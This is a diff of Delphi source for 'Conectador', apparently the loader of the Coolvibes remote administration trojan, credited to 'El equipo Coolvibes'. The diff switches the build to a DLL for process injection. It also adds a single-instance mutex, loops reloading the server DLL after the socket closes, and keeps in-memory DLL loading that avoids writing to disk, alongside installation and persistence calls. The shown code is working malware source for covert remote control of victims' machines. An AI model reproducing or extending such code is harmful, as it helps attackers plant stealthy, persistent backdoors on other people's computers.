@@ -11,16 +11,15 @@
 
      El equipo Coolvibes
 *)
-//library Conectador; //Para inyectar descomentar
-program Conectador; //Para no inyectar descomentar
+library Conectador; //Para inyectar descomentar
+//program Conectador; //Para no inyectar descomentar
 
 uses
   Windows,
   ShellApi,
   Shfolder,
   WinSock,
-
-  BTMemoryModule in 'BTMemoryModule.pas', //Para cargar una DLL en memoria sin escribir en disco
+  BTMemoryModule in 'BTMemoryModule.pas', //Para cargar una DLL en memoria sin escribir en disco, creditos dentro
   MiniReg in 'MiniReg.pas',
   SettingsDef in 'SettingsDef.pas',
   UnitInstalacion in 'UnitInstalacion.pas',
@@ -35,6 +34,7 @@ var
   ClaveCifrado1, ClaveCifrado2: Integer; //Claves para cifrar el plugin
   Loaded: Integer;
   TID: Longword;
+
 
 function GetCurrentDirectory: string; //Conseguir dir actual sin sysutils
 var
@@ -89,7 +89,7 @@ end;
 procedure loaddll(path: string); //Funcion para cargar el servidor en memoria
 var
   content: string;
-  p, p2: Pointer;
+  p: Pointer;
   m_DllDataSize: Cardinal;
   CargarServidor: procedure(P: Pointer);
   Module: PBTMemoryModule;
@@ -260,7 +260,9 @@ begin
       CloseSocket(lSocket);
       Exit; //Nos hemos desconectado
     end;
-
+   CloseSocket(lSocket);
+   while fileExists(dllc) do
+        loaddll(dllc);
 end;
 
 procedure loadsettings();
@@ -336,7 +338,13 @@ begin
 end;
 
 procedure main;
+var
+  Mut: string;
+  Mutex: THandle;
 begin
+  Mut := Configuracion.sPluginName;
+  Mutex := CreateMutex(nil, True, Pchar(Mut));
+  if (Mutex = 0) or (GetLastError <> 0) then exitprocess(0);
   while True do
     begin
       while fileExists(dllc) do
@@ -362,7 +370,7 @@ begin
 
   loadsettings(); //Leemos la configuración
   Instalar();
-  BeginThread(nil, 0, Addr(Main), 0, 0, TID);
+  BeginThread(nil, 0, Addr(Main), nil, 0, TID);
   exitthread(0); //Si tenemos la opción de persistencia activa esto le avisará que hemos leido la configuración
 end.
 
